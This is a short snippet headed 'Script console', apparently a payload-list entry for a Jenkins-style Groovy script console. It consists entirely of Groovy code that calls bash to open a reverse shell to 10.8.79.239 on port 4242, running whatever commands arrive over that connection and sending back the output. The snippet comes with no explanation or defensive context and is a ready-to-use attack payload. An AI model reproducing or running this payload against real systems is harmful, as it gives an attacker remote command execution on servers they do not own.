## Script console
	Runtime r = Runtime.getRuntime();
	p = r.exec(['/bin/bash', '-c', 'exec 5<>/dev/tcp/10.8.79.239/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'] as String[]);
	p.waitFor();